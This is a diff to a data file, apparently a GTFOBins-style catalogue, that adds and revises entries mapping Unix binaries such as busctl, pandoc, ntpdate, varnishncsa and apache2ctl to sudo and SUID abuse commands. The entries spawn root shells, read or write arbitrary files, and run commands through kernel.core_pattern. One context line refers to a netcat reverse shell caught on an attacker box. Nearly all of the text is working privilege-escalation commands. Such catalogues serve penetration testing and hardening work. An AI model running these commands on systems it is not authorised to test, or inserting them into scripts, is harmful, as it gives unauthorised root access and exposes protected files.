@@ -56,6 +56,11 @@ sudo_bins = {
             "code": "sudo aoss /bin/sh"
         }
     ],
+    "apache2ctl": [
+        {
+            "code": "LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop\n"
+        }
+    ],
     "apt": [
         {
             "code": "sudo apt changelog apt\n!/bin/sh\n",
@@ -226,7 +231,7 @@ sudo_bins = {
     ],
     "busctl": [
         {
-            "code": "sudo busctl --show-machine\n!/bin/sh\n"
+            "code": "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'\n"
         }
     ],
     "busybox": [
@@ -1121,6 +1126,11 @@ sudo_bins = {
             "description": "Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
         }
     ],
+    "ncdu": [
+        {
+            "code": "sudo ncdu\nb\n"
+        }
+    ],
     "ncftp": [
         {
             "code": "sudo ncftp\n!/bin/sh\n"
@@ -1187,6 +1197,11 @@ sudo_bins = {
             "code": "sudo nsenter /bin/sh"
         }
     ],
+    "ntpdate": [
+        {
+            "code": "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost\n"
+        }
+    ],
     "octave": [
         {
             "code": "sudo octave-cli --eval 'system(\"/bin/sh\")'"
@@ -1226,7 +1241,8 @@ sudo_bins = {
     ],
     "pandoc": [
         {
-            "code": "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
+            "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null\n",
+            "description": "Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
         }
     ],
     "paste": [
@@ -1651,6 +1667,11 @@ sudo_bins = {
             "code": "sudo su"
         }
     ],
+    "sudo": [
+        {
+            "code": "sudo sudo /bin/sh"
+        }
+    ],
     "sysctl": [
         {
             "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
@@ -1856,6 +1877,11 @@ sudo_bins = {
     "valgrind": [
         {
             "code": "sudo valgrind /bin/sh"
+        }
+    ],
+    "varnishncsa": [
+        {
+            "code": "LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
         }
     ],
     "vi": [
@@ -2167,6 +2193,11 @@ suid_bins = {
     "bridge": [
         {
             "code": "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
+        }
+    ],
+    "busctl": [
+        {
+            "code": "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\n"
         }
     ],
     "busybox": [
@@ -2714,6 +2745,11 @@ suid_bins = {
             "code": "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
         }
     ],
+    "ntpdate": [
+        {
+            "code": "LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost\n"
+        }
+    ],
     "od": [
         {
             "code": "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
@@ -3066,6 +3102,11 @@ suid_bins = {
     "vagrant": [
         {
             "code": "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
+        }
+    ],
+    "varnishncsa": [
+        {
+            "code": "LFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
         }
     ],
     "view": [
